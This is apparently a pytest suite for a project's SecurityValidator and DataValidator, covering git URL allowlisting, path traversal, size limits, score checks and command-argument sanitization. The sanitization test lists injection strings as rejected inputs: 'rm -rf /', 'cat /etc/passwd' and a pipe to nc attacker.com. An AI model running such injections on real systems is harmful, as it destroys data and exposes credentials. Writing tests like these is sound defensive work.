"""
Tests for security validators.
"""

import pytest
from pathlib import Path

from src.utils.validators import SecurityValidator, DataValidator
from src.utils.exceptions import (
    CommandInjectionError,
    PathTraversalError,
    SecurityViolationError,
    ValidationError,
    ResourceLimitError,
)


class TestSecurityValidator:
    """Tests for SecurityValidator class."""

    @pytest.mark.security
    def test_validate_git_url_valid(self):
        """Test validation of valid git URLs."""
        valid_urls = [
            "https://github.com/user/repo",
            "https://gitlab.com/user/repo",
            "https://bitbucket.org/user/repo",
            "http://github.com/user/repo",
        ]

        for url in valid_urls:
            result = SecurityValidator.validate_git_url(url)
            assert result == url

    @pytest.mark.security
    def test_validate_git_url_invalid_domain(self):
        """Test rejection of disallowed domains."""
        with pytest.raises(SecurityViolationError, match="not in allowed list"):
            SecurityValidator.validate_git_url("https://evil.com/repo")

    @pytest.mark.security
    def test_validate_git_url_command_injection(self, malicious_urls):
        """Test detection of command injection attempts."""
        for url in malicious_urls:
            with pytest.raises((CommandInjectionError, SecurityViolationError)):
                SecurityValidator.validate_git_url(url)

    @pytest.mark.security
    def test_validate_git_url_empty(self):
        """Test rejection of empty URLs."""
        with pytest.raises(ValidationError, match="non-empty string"):
            SecurityValidator.validate_git_url("")

    @pytest.mark.security
    def test_validate_git_url_custom_domains(self):
        """Test custom domain allowlist."""
        custom_domains = ["mycompany.com"]
        url = "https://mycompany.com/repo"

        result = SecurityValidator.validate_git_url(url, allowed_domains=custom_domains)
        assert result == url

        # Should fail with default domains
        with pytest.raises(SecurityViolationError):
            SecurityValidator.validate_git_url(url)

    @pytest.mark.security
    def test_validate_file_path_safe(self, temp_dir):
        """Test validation of safe file paths."""
        safe_path = "test.py"
        result = SecurityValidator.validate_file_path(safe_path, temp_dir)

        assert result.is_relative_to(temp_dir)
        assert result.name == "test.py"

    @pytest.mark.security
    def test_validate_file_path_traversal(self, temp_dir, path_traversal_attempts):
        """Test detection of path traversal attempts."""
        for attempt in path_traversal_attempts:
            with pytest.raises(PathTraversalError):
                SecurityValidator.validate_file_path(attempt, temp_dir)

    @pytest.mark.security
    def test_validate_file_path_absolute(self, temp_dir):
        """Test handling of absolute paths outside base."""
        with pytest.raises(PathTraversalError):
            SecurityValidator.validate_file_path("/etc/passwd", temp_dir)

    def test_validate_file_size_within_limit(self, temp_dir):
        """Test file size validation for small files."""
        test_file = temp_dir / "test.txt"
        test_file.write_text("Small content")

        size = SecurityValidator.validate_file_size(test_file, max_size_mb=1)
        assert size > 0
        assert size < 1024 * 1024  # Less than 1MB

    def test_validate_file_size_exceeds_limit(self, temp_dir):
        """Test rejection of oversized files."""
        test_file = temp_dir / "large.txt"
        # Create a file larger than 1 byte (with max_size_mb=0.000001)
        test_file.write_text("X" * 1000)

        with pytest.raises(ResourceLimitError, match="exceeds limit"):
            SecurityValidator.validate_file_size(test_file, max_size_mb=0.000001)

    def test_validate_file_size_nonexistent(self, temp_dir):
        """Test handling of nonexistent files."""
        with pytest.raises(ValidationError, match="not found"):
            SecurityValidator.validate_file_size(temp_dir / "nonexistent.txt")

    def test_validate_directory_size_within_limit(self, mock_git_repo):
        """Test directory size validation."""
        size = SecurityValidator.validate_directory_size(mock_git_repo, max_size_mb=10)
        assert size > 0

    def test_validate_directory_size_exceeds_limit(self, mock_git_repo):
        """Test rejection of oversized directories."""
        with pytest.raises(ResourceLimitError, match="exceeds limit"):
            SecurityValidator.validate_directory_size(mock_git_repo, max_size_mb=0.000001)

    @pytest.mark.security
    def test_sanitize_command_arg_safe(self):
        """Test sanitization of safe command arguments."""
        safe_args = ["--depth", "1", "https://github.com/user/repo"]

        for arg in safe_args:
            result = SecurityValidator.sanitize_command_arg(arg)
            assert result == arg

    @pytest.mark.security
    def test_sanitize_command_arg_dangerous(self):
        """Test detection of dangerous command arguments."""
        dangerous_args = [
            "arg; rm -rf /",
            "arg && cat /etc/passwd",
            "arg | nc attacker.com",
            "arg`whoami`",
            "arg$((1+1))",
        ]

        for arg in dangerous_args:
            with pytest.raises(CommandInjectionError):
                SecurityValidator.sanitize_command_arg(arg)


class TestDataValidator:
    """Tests for DataValidator class."""

    def test_validate_score_valid(self):
        """Test validation of valid scores."""
        for score in range(1, 6):
            result = DataValidator.validate_score(score)
            assert result == score

    def test_validate_score_out_of_range(self):
        """Test rejection of out-of-range scores."""
        with pytest.raises(ValidationError, match="not in valid range"):
            DataValidator.validate_score(0)

        with pytest.raises(ValidationError, match="not in valid range"):
            DataValidator.validate_score(6)

    def test_validate_score_invalid_type(self):
        """Test rejection of non-integer scores."""
        with pytest.raises(ValidationError, match="must be an integer"):
            DataValidator.validate_score(3.5)

        with pytest.raises(ValidationError, match="must be an integer"):
            DataValidator.validate_score("3")

    def test_validate_score_custom_range(self):
        """Test custom score ranges."""
        result = DataValidator.validate_score(7, min_score=1, max_score=10)
        assert result == 7

        with pytest.raises(ValidationError):
            DataValidator.validate_score(11, min_score=1, max_score=10)

    def test_validate_confidence_valid(self):
        """Test validation of valid confidence values."""
        valid_values = [0.0, 0.5, 0.95, 1.0]

        for value in valid_values:
            result = DataValidator.validate_confidence(value)
            assert result == value

    def test_validate_confidence_out_of_range(self):
        """Test rejection of out-of-range confidence values."""
        with pytest.raises(ValidationError, match="not in valid range"):
            DataValidator.validate_confidence(-0.1)

        with pytest.raises(ValidationError, match="not in valid range"):
            DataValidator.validate_confidence(1.1)

    def test_validate_confidence_invalid_type(self):
        """Test rejection of non-numeric confidence values."""
        with pytest.raises(ValidationError, match="must be numeric"):
            DataValidator.validate_confidence("0.5")

    def test_validate_criterion_id_valid(self):
        """Test validation of valid criterion IDs."""
        valid_ids = ["forensic_accuracy_code", "judicial_nuance", "langgraph_architecture"]

        result = DataValidator.validate_criterion_id(valid_ids[0], valid_ids)
        assert result == valid_ids[0]

    def test_validate_criterion_id_invalid(self):
        """Test rejection of unknown criterion IDs."""
        valid_ids = ["criterion1", "criterion2"]

        with pytest.raises(ValidationError, match="Unknown criterion ID"):
            DataValidator.validate_criterion_id("invalid_criterion", valid_ids)
